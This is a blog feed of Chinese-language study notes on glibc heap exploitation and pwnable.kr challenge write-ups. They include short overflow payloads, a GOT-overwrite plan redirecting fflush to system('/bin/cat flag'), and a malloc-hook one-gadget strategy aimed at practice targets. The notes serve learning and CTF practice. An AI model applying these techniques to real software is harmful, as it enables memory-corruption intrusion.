<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FINSENTY54</title>
  
  <subtitle>几处早莺争暖树，谁家新燕啄春泥。</subtitle>
  <link href="http://finsenty54.github.io/atom.xml" rel="self"/>
  
  <link href="http://finsenty54.github.io/"/>
  <updated>2021-03-12T12:32:05.979Z</updated>
  <id>http://finsenty54.github.io/</id>
  
  <author>
    <name>finsenty54</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>heap入门1</title>
    <link href="http://finsenty54.github.io/2021/03/12/heap%E5%85%A5%E9%97%A81/"/>
    <id>http://finsenty54.github.io/2021/03/12/heap%E5%85%A5%E9%97%A81/</id>
    <published>2021-03-12T12:05:25.000Z</published>
    <updated>2021-03-12T12:32:05.979Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code> &quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;</code> 更改glibc版本<br><code>pwd</code>显示当前目录<br><code>apropos</code>搜索man手册<br><code>gef-&gt;search-patten</code><br><code>objdump -M intel</code>汇编改为intel语法<br><code>set disassambly intel</code> gdb更改语法<br><code>b print </code>printf函数下断点</p><a id="more"></a><p>在gdb 里启动gef<br><code>(gdb) source ~/.gdbinit-gef.py</code></p><p>或者传递命令<br><code>gdb.attach(p,&quot;source ~/.gdbinit-gef.py&quot;)</code></p><hr><p><code>gef➤  heap-view </code></p><pre><code>gef➤  gotGOT protection: Partial RelRO | GOT functions: 3[0x804c00c] printf@GLIBC_2.0  →  0x8049036[0x804c010] __libc_start_main@GLIBC_2.0  →  0xf7ddcd40[0x804c014] __isoc99_scanf@GLIBC_2.7  →  0x8049056</code></pre><hr><pre><code>gef➤  heap binsgef➤  heap chunksgef➤  heap chunksChunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE)    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE)    [0x00005555555592a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]Chunk(addr=0x5555555592c0, size=0x20d50, flags=PREV_INUSE)  ←  top chunkgef➤  x/6gx 0x5555555592c00x5555555592c0:    0x0000000000000000    0x00000000000000000x5555555592d0:    0x0000000000000000    0x00000000000000000x5555555592e0:    0x0000000000000000    0x0000000000000000gef➤  x/6gx 0x5555555592c0-0x100x5555555592b0:    0x0000000000000000    0x0000000000020d510x5555555592c0:    0x0000000000000000    0x00000000000000000x5555555592d0:    0x0000000000000000    0x0000000000000000</code></pre><p>查看glibc版本</p><pre><code>┌─[✗]─[zentreisender@parrotos]─[~]└──╼ $ldd --versionldd ./program 显示链接器，加载器版本</code></pre><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><code>call malloc, it returns a pointer to a chunk</code><br>返回一个地址</p><p>64bit 一个chunk段16字节，32bit 8 字节</p><p>查看二进制文件依赖的动态链接库命令 ldd</p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术</p><h3 id="RELRC"><a href="#RELRC" class="headerlink" title="RELRC"></a>RELRC</h3><p>Firstly, <code>PLT</code> needs to be located at <code>a fixed offset</code> from the .text section. Secondly, since GOT contains data used by different parts of the program directly, it needs to be allocated at a known static address in memory. Lastly, and more importantly, because the GOT is lazily bound it needs to be writable.</p><p><code>PLT GOT 的偏移都是 写死在文件上</code><br>the linker resolves all dynamically linked functions<code> at the beginning of the execution,</code> and then <code>makes the GOT read-only</code>. 这就是RELRC</p><p>In partial RELRO, the non-PLT part of the GOT section (.got from readelf output) is read only but <code>.got.plt is still writeable</code>. Whereas in complete RELRO, the entire GOT (.got and .got.plt both) is marked as read-only.</p><p><code>.got</code> Section 存放外部全局变量的 GOT 表，非延迟绑定<br><code>.got.plt</code> Section 存放外部函数的 GOT 表，例如 printf，采用延迟绑定。</p><p>.got is for relocations regarding global ‘variables’ while .got.plt is a auxiliary section to act together with .plt when resolving procedures absolute addresses</p><h2 id="编译安装glibc各版本"><a href="#编译安装glibc各版本" class="headerlink" title="编译安装glibc各版本"></a>编译安装glibc各版本</h2><p>下载源码后<br><a href="https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html">https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html</a></p><h3 id="gcc10编译安装glibc-2-23"><a href="#gcc10编译安装glibc-2-23" class="headerlink" title="gcc10编译安装glibc 2.23"></a>gcc10编译安装glibc 2.23</h3><pre><code>../glibc-2.20/configure --prefix=/usr --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin --disable-werror</code></pre><p><code>--disable-werror</code> 这项是忽略错误</p><h3 id="gcc10编译安装glibc-2-27"><a href="#gcc10编译安装glibc-2-27" class="headerlink" title="gcc10编译安装glibc 2.27"></a>gcc10编译安装glibc 2.27</h3><pre><code>CFLAGS=&quot;-g -fcommon -Og&quot; CXXFLAGS=&quot;-g -fcommon -Og&quot; ../glibc-2.27/configure --prefix=/glibc/2.27 --with-headers=/usr/include --with-binutils=/usr/bin --disable-werror </code></pre><p>我编译的时候报了重复定义的错误，加<code>-fcommon</code> 忽视</p><h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><p> first-fit behavior.<code>If a chunk is free and large enough, malloc will select this chunk.</code></p><p>Whenever <code>any chunk</code> (not a fast chunk) is freed,<code> it ends up in the unsorted bin.</code> Insertion happens at the <code>HEAD of the list</code>.</p><p>fast chunks end up in fastbins. As mentioned earlier, fastbins maintain a singly linked list and chunks are inserted and deleted from the HEAD end。<code>头插法</code></p><h3 id="calc"><a href="#calc" class="headerlink" title="calc::"></a>calc::</h3><h4 id="索引计算公式：："><a href="#索引计算公式：：" class="headerlink" title="索引计算公式：："></a>索引计算公式：：</h4><p>The basic formula is as follows:</p><pre><code>        IDX = (CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT        On a 64 bit system the current values are:                MINSIZE: 0x20                MALLOC_ALIGNMENT: 0x10        So we get the following equation:        IDX = (CHUNKSIZE - 0x11) / 0x10</code></pre><h4 id="chunksize计算公式：："><a href="#chunksize计算公式：：" class="headerlink" title="chunksize计算公式：："></a>chunksize计算公式：：</h4><pre><code>It is calculated as follows:        IF x + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)        ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)         =&gt; CHUNKSIZE = (x + 0x8 + 0xf) &amp; ~0xf</code></pre><p>64位下，将<code>最低四位置0</code>，因为size 总是16的倍数，要对齐</p><p>当 req=24 时，request2size(24)=32。0x18+0x8+0xf &amp; ~0xf = 0x20而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节</p><h3 id="fastbin-dup-c"><a href="#fastbin-dup-c" class="headerlink" title="fastbin_dup.c"></a>fastbin_dup.c</h3><p>**double-free **<br><a href="https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html">https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html</a><br>同一地址释放两次，再分配时，可以得到同一地址的两个指针，释放一个指针，但可通过另外一个指针操作释放的这个相同块，放入一些数据</p><p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">https://blog.csdn.net/chennbnbnb/article/details/109284780</a><br>glibc2.31 版本下double free<br>tcache全称是Thead Cache</p><p>首先要填充tcache bin，再分配释放后到 fastbin</p><h3 id="fastbin-dup-into-stack-c-2-23"><a href="#fastbin-dup-into-stack-c-2-23" class="headerlink" title="fastbin_dup_into_stack.c 2.23"></a>fastbin_dup_into_stack.c 2.23</h3><p>在2.31下触发free(): double free detected in tcache 2</p><p>fastbin 是单链，只有fd指针，指向下一个块<br>通过修改fd指针，指向一个伪造的fake chunk</p><pre><code>gef➤  x/15gx 0x602010-0x100x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed twice]0x602010:   0x0000000000602020  0x0000000000000000      &lt;-- fd pointer0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c0x602050:   0x4343434343434343  0x00000000000000000x602060:   0x0000000000000000  0x0000000000020fa10x602070:   0x0000000000000000</code></pre><hr><pre><code>unsigned long long *d = malloc(8);stack_var = 0x20;*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code></pre><p>fastbin 的fd指针指向下一个空闲块的<code> metadata开始的地址处</code><br>malloc 返回的地址指向的是<code>user data开始处</code>，d是double free后的重复块地址，所以上面的赋值是 将<code>fake_chunk的metadata起始地址 赋给 块中的fd指针</code>，因为这是 d 是double free，虽然分配了，但<code>也指向空闲块中</code>，将chUnk fd 指针指向一个 fake chunk 的metadata起始地址处，即prev_size ; size=20; userdata。</p><pre><code>Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55555555a010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x7fffffffdd50, size=0x20, flags=)  ←  Chunk(addr=0x55555555a020, size=0x0, flags=) [incorrect fastbin_index] </code></pre><p>可以看到成功</p><p>typedef struct var newtype;<br>struct var 的别名为newtype、</p><h3 id="heap-consolidation"><a href="#heap-consolidation" class="headerlink" title="heap_consolidation"></a>heap_consolidation</h3><p>Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of attacks.<br>edit a freed chunk using a heap overflow bug to cause consolidation</p><p>overwrite the size to be 0x510, essentially clearing the previous in use bit. This way when we free this chunk, it will think that the previous chunk has been freed</p><p>这样就再分配后，就有两个指针指向同一个块</p><p>改写当前size中 is_prev位，使得释放当前块后，认为<code>前一个块是free的</code><br>heap_overflow </p><pre><code>ptr2 = malloc(0x500);ptr2[-1] 指示sizeptr[-2] 指示prev_size</code></pre><p><code>fastbin_dup_consolidate.c 2.23</code><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate</a><br>利用在 large bin 的分配中 malloc_consolidate 机制绕过 fastbin 对 double free 的检查</p><p>malloc(0x400) small bins（回收最大值）后，<code>fastbin 中的跑到 small bins中</code><br>[+] small_bins[4]: fw=0x55555555b000, bk=0x55555555b000<br> →   Chunk(addr=0x55555555b010, size=0x50, flags=PREV_INUSE)</p><p>2.23 里malloc_consolidate，先回收 fastbins 里的到unsorted bin中，因为这个bin满足不了分配要来，按照大小 又到了small bins中，也有可能到达large bins中。</p><p><code>此时可以再free() 一次，因为该块不在fastbin，释放后归到fastbins中。</code></p><p>这样我们就相当于double free</p><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>一般称被释放后没有被设置为 NULL 的内存指针为<code> dangling pointer</code></p><p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p><p>释放块后，指向其的指针不清除，所以可以再用这个指针写入数据</p><h2 id="babyheap-2017"><a href="#babyheap-2017" class="headerlink" title="babyheap 2017"></a>babyheap 2017</h2><p>有点莽，说实话不是很懂<br><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2017-0ctf-babyheap">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2017-0ctf-babyheap</a><br><a href="https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html">https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html</a><br><a href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></p><p>GNU/Linux 2.6.32 对应着glibc 2.23版本</p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/heap/题目]└──╼ $file /glibc/2.23/lib/libc-2.23.so /glibc/2.23/lib/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /glibc/2.23/lib/ld-linux-x86-64.so.2, BuildID[sha1]=eb6c32093c3e8e3b1c03a382947ec4151d036d75, for GNU/Linux 2.6.32, with debug_info, not stripped</code></pre><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>The first will involve <code>causing heap consolidation to get a libc infoleak</code>. The second will involve using <code>a Fastbin Attack to write a oneshot gadget to the hooc of malloc</code>. The libc infoleak will allow us to break ASLR in libc and know the address of everything, and writing over the malloc hook with a ROP gadget (that will call system) will <code>give us a shell</code> when we call malloc (we need the infoleak to figure out where the malloc hook and rop gadget are)<br>也可以使用chunck overlap泄露unsorted bin的地址</p><hr><p>题目不是原本的相同实现方法，但思想是不变的<br>开启了<code>relrc</code>,不能修改got；alloc pointers in a <code>random mmap area</code>. Therefore, we do not know the address to launch the <code>“unsafe unlink” attack</code></p><hr><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p><code>v6 = __readfsqword(0x28u);</code><br>Read memory from a location specified by an offset relative to the beginning of the GS segment.<br><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-160">https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-160</a></p><pre><code>void* calloc (size_t num, size_t size);Allocate and zero-initialize arraySize of each element.pData = (int*) calloc (i,sizeof(int));</code></pre><p>fill 中size由自己定义，存在漏洞, the vulnerability is evident. We can fill the arbitrary length of input to the heap and overflow anything after that.</p><p><code>$readelf -s /glibc/2.23/lib/libc-2.23.so | grep __malloc_hook</code></p><p>我们想要做的是 泄露libc的基址，Heap overlap.<br>Overlapping two chunks to leak the address of the libc</p><p>将 chunk 4 释放掉，其 fd 指针会被设置为指向 unsorted bin 链表的头部，这个地址在 libc 中，且相对位置固定，利用它就可以算出 libc 被加载的地址<br>这时新的chunk2也指向fd , bk</p><p>调用 malloc() 时，首先判断 hook 函数指针是否为空，不为空则调用它。所以这里我们传入一个 one-gadget。<br><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p><p><code>gef➤  x/10gx (long long)(&amp;main_arena)-0x30</code></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;命令&quot;&gt;&lt;a href=&quot;#命令&quot; class=&quot;headerlink&quot; title=&quot;命令&quot;&gt;&lt;/a&gt;命令&lt;/h2&gt;&lt;p&gt;&lt;code&gt; &amp;quot;LD_PRELOAD&amp;quot;:&amp;quot;./libc-2.23.so&amp;quot;&lt;/code&gt; 更改glibc版本&lt;br&gt;&lt;code&gt;pwd&lt;/code&gt;显示当前目录&lt;br&gt;&lt;code&gt;apropos&lt;/code&gt;搜索man手册&lt;br&gt;&lt;code&gt;gef-&amp;gt;search-patten&lt;/code&gt;&lt;br&gt;&lt;code&gt;objdump -M intel&lt;/code&gt;汇编改为intel语法&lt;br&gt;&lt;code&gt;set disassambly intel&lt;/code&gt; gdb更改语法&lt;br&gt;&lt;code&gt;b print &lt;/code&gt;printf函数下断点&lt;/p&gt;</summary>
    
    
    
    <category term="heap" scheme="http://finsenty54.github.io/categories/heap/"/>
    
    
    <category term="heap" scheme="http://finsenty54.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr (1)</title>
    <link href="http://finsenty54.github.io/2021/03/06/pwnable.kr_1/"/>
    <id>http://finsenty54.github.io/2021/03/06/pwnable.kr_1/</id>
    <published>2021-03-06T01:57:39.000Z</published>
    <updated>2021-03-06T01:58:48.034Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnable-kr-1"><a href="#pwnable-kr-1" class="headerlink" title="pwnable.kr (1)"></a>pwnable.kr (1)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>函数调用栈的查看<br>backtrace：查看函数调用的顺序（函数调用栈的信息）<br>frame N：切换到栈编号为N的上下文中<br>info frame：查看当前函数调用的栈帧信息</p><p>“disassemble /r”命令可以用16进制形式显示程序的原始机器码<br>disass /r ‘fflush@plt’</p><p>echo $PATH</p><a id="more"></a><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>32位， <code>p32()</code> 可以让我们转换整数到<code>小端序</code>格式</p><pre><code>c.sendline(b&quot;AAAA&quot;*13+p32(0xcafebabe))</code></pre><p>加个<code>b</code>，不然是str格式，即<code>utf-8</code>，编码不一样<br>bytes字节符，打印以b开头</p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/pwnable.kr/BOF]└──╼ $python3 exploit.py [+] Opening connection to pwnable.kr on port 9000: Done[*] Switching to interactive mode$ iduid=1008(bof) gid=1008(bof) groups=1008(bof)</code></pre><p>id 命令</p><h3 id="带参运行"><a href="#带参运行" class="headerlink" title="带参运行"></a>带参运行</h3><p>shell=ssh(‘col’,’pwnable.kr’, port=2222 ,password=’guest’)<br>p=shell.process(argv=[‘./col’,data_final]) #带参运行<br>ssh 链接也可以用process()</p><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。<br>每个<code>Unix进程（</code>除了可能的守护进程）应均有<code>三个标准的POSIX文件描述符</code>，对应于三个标准流</p><p>strcmp()<br>0    the contents of both strings are equal</p><pre><code>0    Standard input    STDIN_FILENO    stdin1    Standard output    STDOUT_FILENO    stdout2    Standard error    STDERR_FILENO    stderr</code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>做的少了，拿着文件单步运行了半天，又是strace , ltrace ,想看出些名堂，后来偶然看到upx字符串，就想不是win才有upx压缩，最后放弃；一搜wp才发现linux底下，<code>upx -d </code>就行。</p><p>断点到leave, 然后<br>peda:<br><code>x/s malloc</code>地址就得到flag</p><h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>got 表项覆盖</p><p><a href="https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283">https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283</a><br>栈溢出，<code>scanf(%100, name)</code></p><pre><code>   0x804862f &lt;welcome+38&gt;:    lea    edx,[ebp-0x70]</code></pre><p>0x70=112 至少116个字符溢出到返回地址，name总共一百，所以溢出name不行</p><hr><p>  [24] .data             PROGBITS        0804a024 001024 000008 00  WA  0   0  4<br>我们直接在相应位置ebp-0x10, ebp-0xc放入想要的数字，但是scanf遇空格结束输入 </p><p>gdb-peda$ print $ebp-0x70<br>$1 = (void *) 0xffe43ab8</p><pre><code>0x804857c &lt;login+24&gt;:    mov    edx,DWORD PTR [ebp-0x10]0x80485aa &lt;login+70&gt;:    mov    edx,DWORD PTR [ebp-0xc]0x80485c5 &lt;login+97&gt;:    cmp    DWORD PTR [ebp-0x10],0x528e60x80485ce &lt;login+106&gt;:    cmp    DWORD PTR [ebp-0xc],0xcc07c9</code></pre><p>0x70-xc =100 刚好溢出不到</p><hr><p>scanf()函数接收输入数据时，遇以下情况结束一个数据的输入：<br>① 遇空格、“回车”、“跳格”键。<br>② 遇宽度结束。<br>③ 遇非法输入。</p><hr><p>Partial RELRO(The GOT table can be overwritten)</p><p>So, if I <code>overwrite fflush@got.plt address</code> as <code>system(“/bin/cat flag”)</code>; address, this binary will execute system(“/bin/cat flag”); after scanf .</p><h3 id="小端序研究"><a href="#小端序研究" class="headerlink" title="小端序研究"></a>小端序研究</h3><pre><code>objdump -R ./passcode0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0plt 表项8048430:    ff 25 04 a0 04 08        jmp    *0x804a004命令中地址倒序，即小端序got 表中地址也是倒序，即小端序0x804a00c &lt;puts@got.plt&gt;:    0xf7597ca00x804a00c &lt;puts@got.plt&gt;:    0xa0    0x7c    0x59 0xf7栈中地址也是小端序0000| 0xffb30e38 --&gt; 0xffb30e58gdb-peda$ x/4bx $esp0xffb30e38:    0x58    0x0e    0xb3    0xff只是存储方式是小端序，读出来还是原本的顺序payload += p32(0x0804a004)所以我们小端序写入栈中，执行地址没有小端序，why?输入12345678 = 0xBC 614Egdb-peda$ x/4bx $ebp-0xc0xffffcf4c:    0x4e    0x61    0xbc    0x00栈中是小端序输入的是单字节还是顺序存储，多字节如int，都是小端序</code></pre><hr><p>将fflush的got中的地址改为system的地址，这个地址不是libc库中的地址，而是代码段中的地址，即可以是任意可执行地址， 例如0x080485ea，但还要传参数，所以要提前一些：</p><pre><code>   0x080485e3 &lt;+127&gt;:    mov    DWORD PTR [esp],0x80487af   0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;   0x080485ef &lt;+139&gt;:    leave     0x080485f0 &lt;+140&gt;:    ret    </code></pre><p>0x80487af 字符串参数<br> 0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;</p><p>代码：<br><a href="https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py">https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py</a></p><h2 id="rondom"><a href="#rondom" class="headerlink" title="rondom"></a>rondom</h2><p>简单，rand() 不是true rondom</p><h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/9056630.html">https://www.cnblogs.com/ichunqiu/p/9056630.html</a><br>在执行add r0, r1, #5指令时，第二条指令正在译码阶段，而第三条指令正在取指阶段。在执行第一条指令时，PC寄存器应指向第三条指令。也即，当处理器为三级流水线结构时，PC寄存器总是指向随后的第三条指令。</p><p>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节<br>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节 </p><pre><code>/*  key1    0x00008cdc &lt;+8&gt;:    mov    r3, pc       0x00008ce0 &lt;+12&gt;:    mov    r0, r3           pc=0x8ce4    r4=pc    key2    取pc值的时候应该还在arm状态        pc=0x00008d0c    key3    lr 返回地址=0x00008d80将三个pc值加在一起 等于输入进的 k*/</code></pre><p>服务器好像down了<br>直接给falg:<code>My daddy has a lot of ARMv5te muscle!</code></p><h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>fd=open(“/home/mistake/password”,O_RDONLY,0400) &lt; 0</p><p>比较运算符高于赋值运算符</p><h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p><a href="https://linux.die.net/man/7/credentials">https://linux.die.net/man/7/credentials</a><br><a href="https://en.wikipedia.org/wiki/User_identifier">https://en.wikipedia.org/wiki/User_identifier</a></p><h3 id="各user-id"><a href="#各user-id" class="headerlink" title="各user id"></a>各user id</h3><p>Effective user ID and effective group ID. These IDs are used by the kernel to determine the permissions that the process will have when accessing shared resources such as message queues, shared memory, and semaphores.On most UNIX systems, these IDs also determine the permissions when accessing files.<br> obtain its effective user (group) ID using geteuid(2) (getegid(2)).</p><p>Saved set-user-ID and saved set-group-ID. These IDs are used in set-user-ID and set-group-ID programs to <code>save a copy of the corresponding effective IDs </code>that were set when the program was executed (see execve(2)).<br>A set-user-ID program can assume and drop privileges by switching its effective user ID back and forth between the values in its real user ID and saved set-user-ID. This switching is done via calls to seteuid(2), setreuid(2), or setresuid(2).<br>比如ruid是普通用户，此时降权；suid是root，设置euid为suid后，提权<br> A process can obtain its saved set-user-ID (set-group-ID) using getresuid(2) (getresgid(2)).</p><p>Real user ID and real group ID. These IDs determine who owns the process. A process can obtain its real user (group) ID using getuid(2) (getgid(2)).</p><h3 id="setuid属性，权限，即文件有-s"><a href="#setuid属性，权限，即文件有-s" class="headerlink" title="setuid属性，权限，即文件有+s"></a>setuid属性，权限，即文件有+s</h3><p>-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br>When the setuid or setgid attributes are set on an executable file, then any users able to execute the file will automatically execute the file with the privileges of the file’s owner (commonly root) and/or the file’s group, depending upon the flags set</p><p>chmod by setting the high-order octal digit to 4 for setuid or 2 for setgid. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file, the process will run with user and group permissions set upon it by its owner. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>4701 on an executable file owned by ‘root’ and the group ‘root’</p><p>A user named ‘thompson’ attempts to execute the file. The executable permission for all users is set (the ‘1’) so ‘thompson’ can execute the file. The file owner is ‘root’ and the SUID permission is set (the ‘4’) - so the file is executed as ‘root’.</p><h3 id="本题权限"><a href="#本题权限" class="headerlink" title="本题权限"></a>本题权限</h3><p>shellshock@pwnable:~$ stat -c “%a %A” shellshock<br>2555 -r-xr-sr-x<br> setgid bits</p><p>破壳（ShellShock）漏洞<br><a href="https://www.freebuf.com/articles/system/45390.html">https://www.freebuf.com/articles/system/45390.html</a></p><h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>服务器上没有按pwntools，运行不起来，改成re+socket中不行，懒得弄了</p><h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><p>echo $PATH<br>PATH表明程序所在的目录，运行一个程序，不在当前文件夹中，会遍历PATH中的目录，寻找程序所在文件夹<br>cat 命令在<code>/bin</code> 下<br>该题，用到了linux通配符<br><code>./cmd1 &quot;/bin/cat fla*&quot;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pwnable-kr-1&quot;&gt;&lt;a href=&quot;#pwnable-kr-1&quot; class=&quot;headerlink&quot; title=&quot;pwnable.kr (1)&quot;&gt;&lt;/a&gt;pwnable.kr (1)&lt;/h1&gt;&lt;h2 id=&quot;命令&quot;&gt;&lt;a href=&quot;#命令&quot; class=&quot;headerlink&quot; title=&quot;命令&quot;&gt;&lt;/a&gt;命令&lt;/h2&gt;&lt;p&gt;函数调用栈的查看&lt;br&gt;backtrace：查看函数调用的顺序（函数调用栈的信息）&lt;br&gt;frame N：切换到栈编号为N的上下文中&lt;br&gt;info frame：查看当前函数调用的栈帧信息&lt;/p&gt;
&lt;p&gt;“disassemble /r”命令可以用16进制形式显示程序的原始机器码&lt;br&gt;disass /r ‘fflush@plt’&lt;/p&gt;
&lt;p&gt;echo $PATH&lt;/p&gt;</summary>
    
    
    
    <category term="pwnable.kr" scheme="http://finsenty54.github.io/categories/pwnable-kr/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>heap入门</title>
    <link href="http://finsenty54.github.io/2021/03/04/heap%E5%85%A5%E9%97%A8/"/>
    <id>http://finsenty54.github.io/2021/03/04/heap%E5%85%A5%E9%97%A8/</id>
    <published>2021-03-04T05:57:29.000Z</published>
    <updated>2021-03-12T03:33:49.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆利用Heap-Exploitation"><a href="#堆利用Heap-Exploitation" class="headerlink" title="堆利用Heap Exploitation"></a>堆利用Heap Exploitation</h1><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a><br><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/">https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/</a></p><p>基础知识学习ptmalloc</p><h2 id="命令：："><a href="#命令：：" class="headerlink" title="命令：："></a>命令：：</h2><p><code>gef➤  x/32gx &amp;main_arena </code><br><code>gef➤  heap bins </code></p><a id="more"></a><h2 id="申请与释放"><a href="#申请与释放" class="headerlink" title="申请与释放"></a>申请与释放</h2><p>malloc()<br>free()</p><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc()"></a>malloc()</h3><p>malloc() 使用<code>brk() mmap()</code>申请内存</p><h4 id="brk-sbrk"><a href="#brk-sbrk" class="headerlink" title="brk() sbrk()"></a>brk() sbrk()</h4><p>The<code>program break</code>is the<code>address</code>of the first location beyond the current end of the data region.</p><pre><code>#include &lt;unistd.h&gt;int brk(void* end_data_segment);void *sbrk(intptr_t increment);┌─[zentreisender@parrotos]─[~/Documents/heap]└──╼ $./brkWelcome to sbrk example:178107Program Break Location1:0x555db6660000aProgram break Location2:0x555db6661000Program Break Location3:0x555db6660000a</code></pre><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 